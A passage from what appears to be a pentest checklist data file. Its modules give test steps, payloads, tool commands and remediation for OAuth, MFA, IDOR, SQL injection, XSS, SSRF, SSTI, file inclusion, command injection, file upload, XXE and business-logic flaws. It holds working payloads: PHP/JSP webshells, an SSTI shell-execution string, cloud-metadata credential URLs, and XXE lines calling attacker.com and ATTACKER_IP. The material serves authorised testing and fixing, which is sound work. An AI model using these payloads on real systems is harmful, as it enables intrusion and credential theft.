        "remediation": "Enforce specific algorithms server-side. Use strong secrets (256+ bits). Validate all claims server-side. Reject expired tokens.",
        "tags": ["auth", "jwt", "algorithm-confusion", "token-security"],
        "references": [{"title": "PayloadsAllTheThings - JWT", "url": "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/JSON Web Token"}],
        "applicability_conditions": {"requires_any": ["auth_type:jwt", "api_auth:jwt"]}
    },
    {
        "module_id": "MOD-OAUTH", "phase": "auth", "severity": "high",
        "title": "OAuth 2.0 / SSO Security Testing",
        "description": "Test OAuth flow for state parameter CSRF, code replay, open redirects, and token leakage.",
        "owasp_ref": "A01:2021", "cwe_id": "CWE-601",
        "where_to_test": "OAuth login flow, authorization endpoint, callback URL",
        "what_to_test": "State parameter CSRF protection, authorization code replay, redirect_uri manipulation, scope escalation, implicit flow token leakage",
        "how_to_test": "1. Check if state parameter present and validated in OAuth flow\n2. Capture authorization code → Use it twice → Should fail on second use\n3. Modify redirect_uri to attacker domain → If allowed: token hijacking possible\n4. Try requesting higher scopes than authorized",
        "payloads": [],
        "tool_commands": [
            {"tool": "Burp Suite", "command": "Intercept OAuth flow → Modify state parameter to empty → Check if accepted", "description": "Test CSRF protection on OAuth"},
            {"tool": "curl", "command": "curl 'https://TARGET/oauth/authorize?redirect_uri=https://attacker.com&response_type=code&client_id=CLIENT'", "description": "Test open redirect in redirect_uri"}
        ],
        "pass_indicators": "State parameter validated. Code single-use. redirect_uri strictly validated. No unauthorized scope access.",
        "fail_indicators": "Missing/ignored state parameter. Authorization code reusable. Arbitrary redirect_uri accepted.",
        "remediation": "Enforce state parameter. Single-use authorization codes. Strict redirect_uri allowlist. Scope validation.",
        "tags": ["auth", "oauth", "sso", "csrf", "open-redirect"],
        "references": [{"title": "PayloadsAllTheThings - OAuth", "url": "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/OAuth Misconfiguration"}],
        "applicability_conditions": {"requires_any": ["auth_type:oauth", "auth_type:sso", "auth_type:saml"]}
    },
    {
        "module_id": "MOD-20", "phase": "auth", "severity": "high",
        "title": "Multi-Factor Authentication (MFA) Testing",
        "description": "Test MFA bypass techniques including direct URL access, OTP brute force, OTP reuse, and response manipulation.",
        "owasp_ref": "A07:2021", "cwe_id": "CWE-308",
        "where_to_test": "MFA/OTP input page, post-first-factor session",
        "what_to_test": "MFA bypass via direct URL navigation, OTP brute force (6-digit: 000000-999999), OTP reuse, OTP expiry, response manipulation",
        "how_to_test": "1. After first factor (password), navigate directly to post-auth URL → Should enforce MFA\n2. Submit wrong OTP → Burp Intruder → Brute force 000000-999999\n3. Use valid OTP → Submit again → Should reject reuse\n4. Wait 10 min → Submit old OTP → Should expire\n5. Submit wrong OTP → Intercept response → Change 'success:false' to 'success:true'",
        "payloads": ["000000", "123456", "111111", "000001"],
        "tool_commands": [
            {"tool": "Burp Intruder", "command": "Capture OTP submission → Intruder → Position on OTP value → Payload: Numbers from 000000 to 999999 → Attack", "description": "OTP brute force"},
            {"tool": "Burp Suite", "command": "Submit wrong OTP → Intercept response → Change success:false to success:true → Forward", "description": "Response manipulation bypass"}
        ],
        "pass_indicators": "Direct URL access enforces MFA. OTP brute force rate limited. OTP single-use. Response manipulation fails (server-side check).",
        "fail_indicators": "Direct URL bypass works. OTP brute forceable. OTP reuse allowed. Response manipulation succeeds.",
        "remediation": "Enforce MFA server-side at every request. Rate limit OTP attempts. Single-use OTPs with short expiry.",
        "tags": ["auth", "mfa", "otp", "bypass", "brute-force"],
        "references": [],
        "applicability_conditions": {"requires_any": ["auth_type:mfa", "features:2fa", "auth_type:otp"]}
    },
    # ======================= POST-AUTH =======================
    {
        "module_id": "MOD-21", "phase": "post_auth", "severity": "high",
        "title": "Insecure Direct Object Reference (IDOR)",
        "description": "Test for IDOR vulnerabilities by manipulating object references to access unauthorized data.",
        "owasp_ref": "A01:2021", "cwe_id": "CWE-639",
        "where_to_test": "All API endpoints and URL parameters with object IDs (user IDs, order IDs, file IDs, account numbers)",
        "what_to_test": "Access another user's data by changing numeric/UUID IDs in API requests, URL parameters, and POST bodies",
        "how_to_test": "1. Note your user ID from profile/API response\n2. Change ID to another user's ID: /api/users/123 → /api/users/124\n3. Test sequential IDs, UUIDs from leaked sources\n4. Test file downloads: /download?file_id=456 → /download?file_id=457\n5. Test in Referer headers, hidden form fields, and POST body",
        "payloads": ["1", "2", "100", "1337", "0", "-1", "2147483647"],
        "tool_commands": [
            {"tool": "Burp Suite", "command": "GET /api/user/YOUR_ID → Change to another ID → Compare response", "description": "Manual IDOR test"},
            {"tool": "Autorize", "command": "Install Autorize Burp extension → Configure victim/attacker sessions → Browse as one user → Check if other user's data accessible", "description": "Automated IDOR/auth testing"},
            {"tool": "ffuf", "command": "ffuf -w ids.txt -u https://TARGET/api/users/FUZZ -H 'Authorization: Bearer TOKEN' -mc 200", "description": "Enumerate object IDs"}
        ],
        "pass_indicators": "403 Forbidden returned when accessing another user's resource. Proper authorization checks.",
        "fail_indicators": "Another user's data returned by changing ID. No ownership validation.",
        "remediation": "Implement ownership checks on every data access. Use indirect references (randomized mappings). Verify authorization server-side.",
        "tags": ["post-auth", "idor", "authorization", "access-control"],
        "references": [{"title": "PayloadsAllTheThings - IDOR", "url": "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Insecure Direct Object References"}],
        "applicability_conditions": {}
    },
    {
        "module_id": "MOD-23-VERTICAL", "phase": "post_auth", "severity": "critical",
        "title": "Vertical Privilege Escalation",
        "description": "Test if a regular user can access admin-only functions and endpoints.",
        "owasp_ref": "A01:2021", "cwe_id": "CWE-269",
        "where_to_test": "Admin endpoints, admin panels, privileged API routes",
        "what_to_test": "Regular user accessing /admin/*, /api/admin/*, delete/modify operations reserved for admins",
        "how_to_test": "1. Login as regular user\n2. Try accessing: /admin, /admin/users, /api/admin/config, /api/users/all\n3. Try admin actions: DELETE /api/users/OTHER_USER, PUT /api/roles/user_id\n4. Check if role parameter can be modified in profile update",
        "payloads": ["/admin", "/admin/users", "/api/admin/config", "/api/v1/admin", "/management"],
        "tool_commands": [
            {"tool": "Burp Suite", "command": "Login as user → Browse all admin endpoints → Check if 403/redirect or actual admin content returned", "description": "Manual privilege escalation testing"},
            {"tool": "Autorize", "command": "Configure admin and user sessions → Browse as admin → Autorize checks if user can access same resources", "description": "Automated privilege escalation testing"}
        ],
        "pass_indicators": "403 Forbidden for all admin endpoints when logged in as regular user.",
        "fail_indicators": "Admin pages accessible to regular users. Admin actions executable without proper role.",
        "remediation": "Implement role-based access control (RBAC) on every endpoint. Check role at controller/middleware level.",
        "tags": ["post-auth", "privilege-escalation", "rbac", "authorization"],
        "references": [],
        "applicability_conditions": {}
    },
    {
        "module_id": "MOD-MASS-ASSIGNMENT", "phase": "post_auth", "severity": "high",
        "title": "Mass Assignment Vulnerability",
        "description": "Test if unintended fields like role, isAdmin, balance can be set through API or form submissions.",
        "owasp_ref": "A03:2021", "cwe_id": "CWE-915",
        "where_to_test": "User registration, profile update, any POST/PUT endpoint",
        "what_to_test": "Setting privileged fields: admin=true, role=admin, isAdmin=true, balance=9999, verified=true",
        "how_to_test": "1. Capture registration or profile update POST request\n2. Add extra fields to JSON body: 'admin': true, 'role': 'admin', 'balance': 9999\n3. Submit and check if changes take effect\n4. Check response for changed values or re-fetch profile",
        "payloads": [],
        "tool_commands": [
            {"tool": "Burp Suite", "command": "POST /api/register {\\\"username\\\":\\\"test\\\",\\\"password\\\":\\\"test\\\",\\\"role\\\":\\\"admin\\\",\\\"admin\\\":true} → Check if admin role assigned", "description": "Mass assignment via registration"},
            {"tool": "Burp Suite", "command": "PUT /api/profile {\\\"name\\\":\\\"test\\\",\\\"isAdmin\\\":true,\\\"balance\\\":99999} → Re-fetch profile to check changes", "description": "Mass assignment via profile update"}
        ],
        "pass_indicators": "Extra fields ignored or rejected. 400 error for unknown properties. Role changes not accepted.",
        "fail_indicators": "Admin role set via registration. Balance modified. isAdmin accepted.",
        "remediation": "Use allowlist validation for request body properties. Never auto-bind all request parameters to model.",
        "tags": ["post-auth", "mass-assignment", "authorization"],
        "references": [{"title": "PayloadsAllTheThings - Mass Assignment", "url": "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Mass Assignment"}],
        "applicability_conditions": {}
    },
    {
        "module_id": "MOD-36-AUTH", "phase": "post_auth", "severity": "critical",
        "title": "SQL Injection (Authenticated)",
        "description": "Comprehensive SQL injection testing on all authenticated endpoints and parameters.",
        "owasp_ref": "A03:2021", "cwe_id": "CWE-89",
        "where_to_test": "Search fields, filter parameters, profile fields, API parameters, URL parameters",
        "what_to_test": "Error-based, boolean-based, time-based blind, and union-based SQL injection in all input parameters",
        "how_to_test": "1. Add single quote to every parameter → Check for SQL errors\n2. Test boolean: param=1 AND 1=1 (true) vs param=1 AND 1=2 (false) → compare responses\n3. Test time-based: param=1; WAITFOR DELAY '0:0:5'-- (MSSQL) or ' AND SLEEP(5)-- (MySQL)\n4. Run SQLMap on all interesting endpoints",
        "payloads": [
            "'", "\"", "' OR '1'='1", "' AND 1=1--", "' AND 1=2--",
            "' UNION SELECT null--", "' AND SLEEP(5)--", "'; WAITFOR DELAY '0:0:5'--",
            "' AND extractvalue(1,concat(0x7e,version()))--",
            "' ORDER BY 1--", "' ORDER BY 10--"
        ],
        "tool_commands": [
            {"tool": "sqlmap", "command": "sqlmap -u 'https://TARGET/api/search?q=test' -H 'Authorization: Bearer TOKEN' --level=5 --risk=3 --dbs --batch", "description": "SQLMap on authenticated API endpoint"},
            {"tool": "sqlmap", "command": "sqlmap -u 'https://TARGET/api/profile' --data='{\"name\":\"test*\"}' --content-type='application/json' --level=5 --dbs --batch", "description": "SQLMap on JSON POST body"}
        ],
        "pass_indicators": "SQL errors handled. Parameterized queries prevent injection. SQLMap returns no vulnerabilities.",
        "fail_indicators": "Database error messages visible. Data extracted via UNION. Time delay successful. SQLMap confirms vulnerability.",
        "remediation": "Use ORM or parameterized queries exclusively. Implement WAF. Least privilege database accounts.",
        "tags": ["post-auth", "sqli", "critical", "database"],
        "references": [{"title": "PayloadsAllTheThings - SQL Injection", "url": "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL Injection"}],
        "applicability_conditions": {}
    },
    {
        "module_id": "MOD-35-XSS", "phase": "post_auth", "severity": "high",
        "title": "Cross-Site Scripting (XSS) — Stored, Reflected, DOM",
        "description": "Test all input fields for XSS vulnerabilities including stored, reflected, and DOM-based XSS.",
        "owasp_ref": "A03:2021", "cwe_id": "CWE-79",
        "where_to_test": "ALL input fields: search, profile, comments, messages, file names, URL parameters, JSON fields",
        "what_to_test": "Reflected XSS in URL params, stored XSS in database-backed inputs, DOM XSS via JavaScript sinks (innerHTML, document.write)",
        "how_to_test": "1. Test basic XSS in all input fields\n2. Test filter bypass payloads\n3. Test DOM-based XSS via URL hash\n4. Check all places where user input is reflected\n5. Use XSStrike for automated XSS discovery",
        "payloads": [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "\"><script>alert(1)</script>",
            "<svg onload=alert(1)>",
            "<ScRiPt>alert(1)</ScRiPt>",
            "javascript:alert(1)",
            "<body onpageshow=alert(1)>",
            "<iframe src=javascript:alert(1)>",
            "'><img src=x onerror=alert(document.cookie)>",
            "<math><mi//xlink:href='data:x,<script>alert(1)</script>'>",
            "{{7*7}}",
            "${7*7}"
        ],
        "tool_commands": [
            {"tool": "XSStrike", "command": "python xsstrike.py -u 'https://TARGET/search?q=FUZZ' --crawl --blind", "description": "Automated XSS discovery"},
            {"tool": "Burp Scanner", "command": "Right-click target in Burp → Scan → Active Scan → XSS checks enabled", "description": "Burp active XSS scan"},
            {"tool": "dalfox", "command": "dalfox url 'https://TARGET/search?q=test' -H 'Authorization: Bearer TOKEN'", "description": "DalFox XSS scanner"}
        ],
        "pass_indicators": "Script tags rendered as text. CSP prevents execution. Output properly HTML-encoded.",
        "fail_indicators": "Script executes. Alert box appears. Cookie data exfiltrated. User input reflected unencoded.",
        "remediation": "HTML encode all user output. Implement strict CSP. Use DOMPurify for rich text. Avoid innerHTML with user data.",
        "tags": ["post-auth", "xss", "stored-xss", "reflected-xss", "dom-xss"],
        "references": [{"title": "PayloadsAllTheThings - XSS", "url": "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS Injection"}],
        "applicability_conditions": {}
    },
    {
        "module_id": "MOD-SSRF", "phase": "post_auth", "severity": "critical",
        "title": "Server-Side Request Forgery (SSRF)",
        "description": "Test for SSRF in any feature that makes server-side HTTP requests based on user input.",
        "owasp_ref": "A10:2021", "cwe_id": "CWE-918",
        "where_to_test": "URL parameters, webhook URLs, import/fetch features, PDF generators, image URL fields",
        "what_to_test": "Internal network access, cloud metadata service access, file read via file://, blind SSRF via DNS callback",
        "how_to_test": "1. Find any parameter that accepts URLs\n2. Try: http://127.0.0.1, http://localhost, http://169.254.169.254/ (AWS metadata)\n3. Use Burp Collaborator for blind SSRF detection\n4. Try filter bypass techniques: @127.0.0.1, 0x7f000001, 127.1",
        "payloads": [
            "http://127.0.0.1", "http://localhost", "http://0.0.0.0",
            "http://169.254.169.254/latest/meta-data/", "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            "http://metadata.google.internal/computeMetadata/v1/",
            "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
            "file:///etc/passwd", "file:///C:/Windows/System32/drivers/etc/hosts",
            "dict://127.0.0.1:6379/INFO", "gopher://127.0.0.1:6379/_INFO",
            "http://[::1]", "http://0177.0.0.1", "@127.0.0.1"
        ],
        "tool_commands": [
            {"tool": "Burp Collaborator", "command": "Generate collaborator URL → Use as parameter value → Check for DNS/HTTP callbacks", "description": "Blind SSRF detection"},
            {"tool": "curl", "command": "curl -X POST 'https://TARGET/api/webhook' -d '{\"url\":\"http://169.254.169.254/latest/meta-data/\"}' -H 'Authorization: Bearer TOKEN'", "description": "Test SSRF in webhook parameter"}
        ],
        "pass_indicators": "Internal URLs rejected. Allowlist-only external URLs. No cloud metadata accessible.",
        "fail_indicators": "Internal services accessible. Cloud metadata retrieved. Blind SSRF callback received.",
        "remediation": "Implement URL allowlist. Block internal IP ranges. Use separate SSRF proxy service. Disable unnecessary URL fetch features.",
        "tags": ["post-auth", "ssrf", "critical", "server-side"],
        "references": [{"title": "PayloadsAllTheThings - SSRF", "url": "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server Side Request Forgery"}],
        "applicability_conditions": {}
    },
    {
        "module_id": "MOD-SSTI", "phase": "post_auth", "severity": "critical",
        "title": "Server-Side Template Injection (SSTI)",
        "description": "Test for SSTI in all user-controlled template contexts across major template engines.",
        "owasp_ref": "A03:2021", "cwe_id": "CWE-94",
        "where_to_test": "All input fields, URL parameters, email templates, error pages, profile names",
        "what_to_test": "Template expression injection: Jinja2 (Python), Twig (PHP), Freemarker (Java), Pebble, Velocity, Smarty, Handlebars",
        "how_to_test": "1. Inject {{7*7}} → If 49 in response: Jinja2/Twig/Pebble\n2. Inject ${7*7} → If 49: Freemarker/Velocity\n3. Inject <%= 7*7 %> → If 49: ERB/JSP\n4. Inject {{config.items()}} → Jinja2 config disclosure\n5. Progress to RCE: {{''.__class__.__mro__[1].__subclasses__()}}",
        "payloads": [
            "{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}", "*{7*7}",
            "{{7*'7'}}", "@(7*7)",
            "{{config.items()}}", "{{settings.SECRET_KEY}}",
            "{{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0].strip()}}",
            "${\"freemarker.template.utility.Execute\"?new()(\"id\")}",
            "{{request|attr('application')|attr('__globals__')|attr('__getitem__')('__builtins__')}}"
        ],
        "tool_commands": [
            {"tool": "tplmap", "command": "python tplmap.py -u 'https://TARGET/search?name=INJECT' --os-shell", "description": "Automated SSTI detection and exploitation"},
            {"tool": "Burp Suite", "command": "Send to Repeater → Inject {{7*7}} in all parameters → Check for 49 in response", "description": "Manual SSTI detection probe"}
        ],
        "pass_indicators": "Template expressions rendered as literal text. No expression evaluation. Proper input sanitization.",
        "fail_indicators": "Mathematical expressions evaluated ({{7*7}} returns 49). Template config/globals accessible. RCE achieved.",
        "remediation": "Never render user input as template code. Use sandboxed template rendering. Validate and escape all user inputs.",
        "tags": ["post-auth", "ssti", "rce", "critical", "template-injection"],
        "references": [{"title": "PayloadsAllTheThings - SSTI", "url": "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server Side Template Injection"}],
        "applicability_conditions": {}
    },
    {
        "module_id": "MOD-47", "phase": "post_auth", "severity": "critical",
        "title": "File Inclusion (LFI/RFI)",
        "description": "Test for Local File Inclusion (LFI) and Remote File Inclusion (RFI) vulnerabilities.",
        "owasp_ref": "A03:2021", "cwe_id": "CWE-22",
        "where_to_test": "File parameters, page parameters, path parameters, template parameters",
        "what_to_test": "Reading arbitrary files via LFI (../../etc/passwd), remote file inclusion via external URLs, path traversal",
        "how_to_test": "1. Find parameters that reference files: ?page=, ?file=, ?template=, ?lang=\n2. Test path traversal: ../../../etc/passwd\n3. Test URL wrappers: php://filter, file://, data://\n4. Test null byte injection (legacy PHP): ../../etc/passwd%00",
        "payloads": [
            "../../../etc/passwd", "..%2f..%2f..%2fetc%2fpasswd",
            "....//....//....//etc/passwd", "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "/etc/passwd", "/etc/shadow", "/proc/self/environ",
            "php://filter/convert.base64-encode/resource=/etc/passwd",
            "expect://id", "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOyA/Pg==",
            "../../../../etc/passwd%00.php"
        ],
        "tool_commands": [
            {"tool": "ffuf", "command": "ffuf -w /opt/navigator/data/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt -u 'https://TARGET/page?file=FUZZ'", "description": "LFI fuzzing with wordlist"},
            {"tool": "LFISuite", "command": "python lfisuite.py", "description": "Automated LFI exploitation"}
        ],
        "pass_indicators": "Path traversal blocked. File access limited to allowed directory. No file content returned.",
        "fail_indicators": "/etc/passwd content returned. Remote files included. Internal source code readable.",
        "remediation": "Use allowlist of permitted files. Resolve and validate paths. Disable dangerous PHP wrappers.",
        "tags": ["post-auth", "lfi", "rfi", "path-traversal", "file-inclusion"],
        "references": [{"title": "PayloadsAllTheThings - File Inclusion", "url": "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File Inclusion"}],
        "applicability_conditions": {}
    },
    {
        "module_id": "MOD-CMD-INJECT", "phase": "post_auth", "severity": "critical",
        "title": "Command Injection",
        "description": "Test for OS command injection in all input fields that might trigger system commands.",
        "owasp_ref": "A03:2021", "cwe_id": "CWE-78",
        "where_to_test": "Any field with ping/nslookup functionality, file operations, report generators, import features",
        "what_to_test": "Command injection via semicolons, pipes, backticks, newlines in parameters",
        "how_to_test": "1. Find features that interact with OS (ping, whois, file conversion, image processing)\n2. Inject: ; id, | id, ` id `, && id, || id\n3. Blind injection: ; sleep 5, | ping -c 5 127.0.0.1\n4. Use Burp Collaborator for OOB command injection",
        "payloads": [
            "; id", "| id", "`id`", "$(id)", "& id &", "&& id",
            "; whoami", "; sleep 5", "| sleep 5", "`sleep 5`",
            "; ping -c 5 127.0.0.1", "| ping -c 5 127.0.0.1",
            "\n/usr/bin/id", "|/usr/bin/id", ";/usr/bin/id",
            "127.0.0.1; cat /etc/passwd", "127.0.0.1 | cat /etc/passwd"
        ],
        "tool_commands": [
            {"tool": "commix", "command": "commix --url='https://TARGET/api/ping?host=127.0.0.1' --data='host=*' --level=3", "description": "Automated command injection testing"},
            {"tool": "Burp Suite", "command": "Send to Repeater → Inject ; sleep 5 in all parameters → Check response time", "description": "Time-based blind command injection"}
        ],
        "pass_indicators": "OS commands not executed. Input properly sanitized. No response time differences with sleep payloads.",
        "fail_indicators": "Command output in response. Successful sleep delay. OOB DNS/HTTP callback received.",
        "remediation": "Never pass user input to OS commands. Use safe library functions. Validate input strictly. Sandbox execution environment.",
        "tags": ["post-auth", "command-injection", "rce", "critical"],
        "references": [{"title": "PayloadsAllTheThings - Command Injection", "url": "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command Injection"}],
        "applicability_conditions": {}
    },
    {
        "module_id": "MOD-14", "phase": "post_auth", "severity": "high",
        "title": "Malicious File Upload",
        "description": "Test file upload functionality for malicious file upload leading to code execution.",
        "owasp_ref": "A04:2021", "cwe_id": "CWE-434",
        "where_to_test": "All file upload features: profile pictures, documents, imports, attachments",
        "what_to_test": "Upload PHP/ASP/JSP webshells, bypass extension filters, MIME type bypass, double extensions, null byte injection",
        "how_to_test": "1. Upload .php file directly → Check if accepted\n2. Try double extension: shell.php.jpg\n3. Rename to valid extension but change MIME type to PHP\n4. Try null byte: shell.php%00.jpg\n5. Upload SVG with embedded XSS\n6. Check where files are stored and if executable",
        "payloads": [
            "<?php system($_GET['cmd']); ?>",
            "<?php echo shell_exec($_GET['e']); ?>",
            "<% Runtime.getRuntime().exec(request.getParameter('cmd')); %>"
        ],
        "tool_commands": [
            {"tool": "Burp Suite", "command": "Upload PHP file → Intercept → Change Content-Type to image/jpeg → Forward → Access uploaded file URL", "description": "MIME type bypass"},
            {"tool": "curl", "command": "curl -X POST 'https://TARGET/upload' -F 'file=@shell.php;type=image/jpeg' -H 'Authorization: Bearer TOKEN'", "description": "Upload webshell with image MIME type"}
        ],
        "pass_indicators": "Only allowed extensions accepted. File executed as data not code. Upload directory non-executable. Content validation on server side.",
        "fail_indicators": "PHP/ASP files uploaded and executed. Extension bypass successful. Webshell accessible.",
        "remediation": "Validate file content (magic bytes). Randomize filenames. Store uploads outside web root. Disable script execution in upload dirs.",
        "tags": ["post-auth", "file-upload", "webshell", "rce"],
        "references": [{"title": "PayloadsAllTheThings - File Upload", "url": "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload Insecure Files"}],
        "applicability_conditions": {"requires_any": ["features:file_upload"]}
    },
    {
        "module_id": "MOD-XXE", "phase": "post_auth", "severity": "high",
        "title": "XML External Entity (XXE) Injection",
        "description": "Test XML parsing endpoints for XXE vulnerabilities allowing file read, SSRF, and DoS.",
        "owasp_ref": "A05:2021", "cwe_id": "CWE-611",
        "where_to_test": "Any endpoint accepting XML input, file upload of XML/SVG/DOCX, JSON endpoints (try switching Content-Type)",
        "what_to_test": "File read via XXE, SSRF via XXE, blind XXE via OOB, XML-bomb DoS",
        "how_to_test": "1. Find XML-accepting endpoints\n2. Inject DOCTYPE with ENTITY pointing to /etc/passwd\n3. Try switching Content-Type from JSON to XML\n4. Upload SVG/DOCX files with XXE payload\n5. Use Burp Collaborator for blind XXE",
        "payloads": [
            "<?xml version='1.0'?><!DOCTYPE root [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><root>&xxe;</root>",
            "<?xml version='1.0'?><!DOCTYPE root [<!ENTITY xxe SYSTEM 'http://BURP-COLLABORATOR.com'>]><root>&xxe;</root>",
            "<?xml version='1.0'?><!DOCTYPE root [<!ENTITY % remote SYSTEM 'http://attacker.com/evil.dtd'>%remote;]><root/>",
            "<?xml version='1.0'?><!DOCTYPE bomb [<!ENTITY a 'aaaaaaaaaaaaaaaaaa'><!ENTITY b '&a;&a;&a;&a;&a;'>]><bomb>&b;</bomb>"
        ],
        "tool_commands": [
            {"tool": "Burp Suite", "command": "Send XML request to Repeater → Inject XXE payload → Check response for file content", "description": "Manual XXE testing"},
            {"tool": "XXEinjector", "command": "ruby XXEinjector.rb --host=ATTACKER_IP --httpport=80 --file=/tmp/req.txt --path=/etc/passwd --oob=http --phpfilter", "description": "Automated XXE exploitation"}
        ],
        "pass_indicators": "DOCTYPE stripped. External entities disabled. XML parser safely configured.",
        "fail_indicators": "/etc/passwd content in response. OOB DNS/HTTP callback. Blind XXE confirmed.",
        "remediation": "Disable external entity processing. Use safe XML parsers. Validate input schema. Convert XML to JSON where possible.",
        "tags": ["post-auth", "xxe", "xml", "file-read", "ssrf"],
        "references": [{"title": "PayloadsAllTheThings - XXE", "url": "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE Injection"}],
        "applicability_conditions": {"requires_any": ["api_format:xml", "api_type:soap"]}
    },
    # ======================= BUSINESS LOGIC =======================
    {
        "module_id": "MOD-43-WORKFLOW", "phase": "business", "severity": "high",
        "title": "Business Logic Workflow Bypass",
        "description": "Test for workflow step bypass, parameter manipulation to skip validation steps.",
        "owasp_ref": "A04:2021", "cwe_id": "CWE-840",
        "where_to_test": "Multi-step processes: checkout, registration, approval workflows",
        "what_to_test": "Skip verification steps, go directly to final step, manipulate state parameters",
        "how_to_test": "1. Map the intended flow (Step 1 → 2 → 3 → 4)\n2. After step 1, navigate directly to step 3 URL\n3. Replay step 3 request without completing step 2\n4. Manipulate step/state parameters in requests\n5. Use browser back button after completing process",
        "payloads": [],
        "tool_commands": [
            {"tool": "Burp Suite", "command": "Map all workflow steps in Site Map → Skip step 2 → Directly send step 3 request → Check if accepted", "description": "Workflow step bypass test"}
        ],
        "pass_indicators": "Server validates all required previous steps. Cannot skip steps. Sequence enforced server-side.",
        "fail_indicators": "Can skip verification steps. Direct access to final step succeeds. State manipulation works.",
        "remediation": "Validate all previous steps server-side. Store workflow state server-side, not client-side. Implement step tokens.",
        "tags": ["business-logic", "workflow-bypass", "step-bypass"],
        "references": [{"title": "PayloadsAllTheThings - Business Logic", "url": "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Business Logic Errors"}],
        "applicability_conditions": {}
    },
    {
        "module_id": "MOD-43-PRICE", "phase": "business", "severity": "high",
        "title": "Price & Quantity Manipulation",
        "description": "Test for price tampering, negative quantity attacks, integer overflow in order/payment flows.",
        "owasp_ref": "A04:2021", "cwe_id": "CWE-840",
        "where_to_test": "Shopping cart, order placement, pricing parameters in API",
        "what_to_test": "Negative price (price=-1), negative quantity (qty=-1), zero price, integer overflow quantity, price parameter manipulation",
        "how_to_test": "1. Intercept add-to-cart or checkout request\n2. Change price to 0.01 or negative value\n3. Change quantity to -1 (may trigger refund or credit)\n4. Change quantity to 9999999999 (integer overflow → 0)\n5. Remove price parameter entirely",
        "payloads": ["-1", "0", "0.01", "-100", "9999999999", "2147483648"],
        "tool_commands": [
            {"tool": "Burp Suite", "command": "POST /api/cart/add {\\\"product_id\\\":1,\\\"qty\\\":1,\\\"price\\\":0.01} → Check if order created at $0.01", "description": "Price parameter manipulation"},
            {"tool": "Burp Suite", "command": "POST /api/cart/add {\\\"qty\\\":-1} → Check if balance credited or price becomes negative", "description": "Negative quantity attack"}
        ],
        "pass_indicators": "Server recalculates price from product catalog. Client-supplied prices rejected. Negative quantities blocked.",
        "fail_indicators": "Price parameter accepted from client. Negative quantity triggers credit. Integer overflow causes $0 order.",
        "remediation": "Calculate prices server-side from product catalog. Validate quantity is positive. Implement minimum price validation.",
        "tags": ["business-logic", "price-manipulation", "ecommerce", "negative-quantity"],
        "references": [],
        "applicability_conditions": {"requires_any": ["features:shopping_cart", "features:payment"]}
    },
    {
        "module_id": "MOD-RACE", "phase": "business", "severity": "high",
        "title": "Race Condition Testing",
        "description": "Test for race conditions in critical flows like coupon redemption, account balance operations, and free trials.",
        "owasp_ref": "A04:2021", "cwe_id": "CWE-362",
        "where_to_test": "Coupon/voucher redemption, balance transfers, referral programs, time-limited offers",
        "what_to_test": "Send simultaneous requests to exploit TOCTOU (Time of Check to Time of Use) vulnerabilities",
        "how_to_test": "1. Identify critical single-use operations (coupon, referral, limited access)\n2. Burp Suite → Turbo Intruder → Send 50 simultaneous identical requests\n3. Check if operation executed more than once\n4. Monitor for double-spend or double-redemption",
        "payloads": [],
        "tool_commands": [
            {"tool": "Turbo Intruder", "command": "Burp → Extensions → Turbo Intruder → Load race_single_packet_attack.py → Send 50 parallel requests to coupon endpoint", "description": "Race condition via Turbo Intruder"},
            {"tool": "curl", "command": "for i in {1..50}; do curl -X POST 'https://TARGET/api/coupon/apply' -d '{\"code\":\"SAVE50\"}' -H 'Authorization: Bearer TOKEN' & done; wait", "description": "Parallel coupon redemption test"}
        ],
        "pass_indicators": "Database-level locks prevent race conditions. Coupon only redeemed once regardless of concurrent requests.",
        "fail_indicators": "Coupon applied multiple times. Balance credited multiple times. Race condition exploitable.",
        "remediation": "Use database transactions with row-level locking. Implement idempotency keys. Use optimistic/pessimistic locking.",
        "tags": ["business-logic", "race-condition", "concurrency", "coupon"],
        "references": [{"title": "PayloadsAllTheThings - Race Condition", "url": "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Race Condition"}],
        "applicability_conditions": {}
    },
    {
        "module_id": "MOD-44", "phase": "business", "severity": "critical",
        "title": "Payment Gateway Security",
        "description": "Test payment flow for response tampering, replay attacks, amount manipulation, and gateway bypass.",
        "owasp_ref": "A04:2021", "cwe_id": "CWE-840",
        "where_to_test": "Payment processing flow, payment callback/webhook endpoints",
        "what_to_test": "Payment status response tampering, callback replay, amount in callback modification, test card acceptance in production",
        "how_to_test": "1. Intercept payment gateway callback → Change 'status': 'failed' to 'success'\n2. Complete payment → Replay callback for another order ID\n3. Modify amount in callback to 0.01\n4. Test with test card numbers in production: 4111111111111111\n5. Check if payment order ID can be substituted",
        "payloads": [],
        "tool_commands": [
            {"tool": "Burp Suite", "command": "Intercept payment callback POST → Modify status=success → Forward → Check if order activated", "description": "Payment status response tampering"},
            {"tool": "Burp Repeater", "command": "Copy successful payment callback → Change order_id to pending order → Replay → Check activation", "description": "Payment callback replay attack"}
        ],
        "pass_indicators": "Payment status verified directly with gateway. Callback authenticated via HMAC. Replay rejected. Amount not from client.",
        "fail_indicators": "Status change in callback activates order. Callback replay works. Amount manipulatable. Test cards work in production.",
        "remediation": "Verify payment status via server-to-server API call to gateway. Validate HMAC on callbacks. Use idempotency keys.",
